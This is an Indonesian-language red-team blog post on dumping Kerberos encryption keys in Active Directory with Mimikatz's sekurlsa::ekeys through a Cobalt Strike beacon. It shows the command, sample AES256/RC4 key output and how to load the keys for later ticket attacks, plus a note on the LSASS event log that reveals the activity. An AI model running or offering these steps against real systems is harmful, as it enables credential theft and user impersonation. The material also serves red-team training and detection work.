---
title: '[Credential Theft] Kerberos Encryption Keys'
date: 2023-07-29 11:11:22 +0700
categories: ['Active Directory', 'Post Compromise Attack']
tags: [red team, active directory hacking, windows hacking, post compromise attack, credential theft, mimikatz, cobalt strike, kerberos]     # TAG names should always be lowercase
author: nairpaa
---

Kerberos adalah protokol otentikasi jaringan yang digunakan dalam sistem seperti Active Directory. 

Kunci enkripsi Kerberos digunakan dalam proses otentikasi dan jika dicuri, penyerang dapat meng-*impersonate* pengguna atau *service* dalam jaringan tersebut. 

Sebagian besar *service* Windows modern lebih memilih menggunakan Kerberos daripada NTLM. Ini membuat alih-alih menggunakan *hash* NTLM, penyerang bisa menggunakan kunci Kerberos sebagai strategi yang lebih efektif untuk menyamarkan serangan sebagai *traffic* otentikasi normal.

Kunci enkripsi Kerberos ini dapat digunakan dalam berbagai skenario penyalahgunaan Kerberos, seperti [Silver Ticket](/posts/silver-ticket/), [Golden Ticket](/posts/golden-ticket/), dan [Diamond Ticket](/posts/diamond-ticket/).


## 0x1 - Exploitation Stages

> Perintah ini memerlukan hak akses yang lebih tinggi.
{: .prompt-warning}

Modul Mimikatz `sekurlsa::ekeys` akan men-*dump* kunci enkripsi Kerberos dari pengguna yang sedang *login*.

```powershell
beacon> mimikatz !sekurlsa::ekeys

Authentication Id : 0 ; 459935 (00000000:0007049f)
Session           : Batch from 0
User Name         : namina
Domain            : DEV
Logon Server      : DC-2
Logon Time        : 9/1/2023 8:32:19 AM
SID               : S-1-5-21-569305411-121244042-2357301523-1105

	 * Username : namina
	 * Domain   : DEV.EXAMPLE.IO
	 * Password : (null)
	 * Key List :
	   aes256_hmac       4a8a74daad837ae09e9ecc8c2f1b89f960188cb934db6d4bbebade8318ae57c6
	   rc4_hmac_nt       59fc0f884922b4ce376051134c71e22c
	   rc4_hmac_old      59fc0f884922b4ce376051134c71e22c
	   rc4_md4           59fc0f884922b4ce376051134c71e22c
	   rc4_hmac_nt_exp   59fc0f884922b4ce376051134c71e22c
	   rc4_hmac_old_exp  59fc0f884922b4ce376051134c71e22c
```

> Ada [masalah yang diketahui](https://github.com/gentilkiwi/mimikatz/issues/314) di mana Mimikatz mungkin salah melabeli semua *hash* sebagai `des_cbc_md4`.
{: .prompt-info }

Dalam kasus ini, kunci AES256 adalah yang kita inginkan. 

*Hash* ini tidak secara otomatis ditambahkan pada Cobalt Strike, tetapi bisa ditambahkan secara manual melalui **View > Credentials > Add**.

> **OPSEC**
>
> Modul Mimikatz ini akan membuka *read handle* LSASS yang dapat dicatat dalam *event log* `4656`.
> 
> Kita bisa menggunakan kata kunci "`Suspicious Handle to LSASS`" pada Kibana untuk melihat *log* ini.
{: .prompt-danger }

---

## 0x2 - References

- https://adsecurity.org/?page_id=1821
- https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-mimikatz
- https://adsecurity.org/?p=556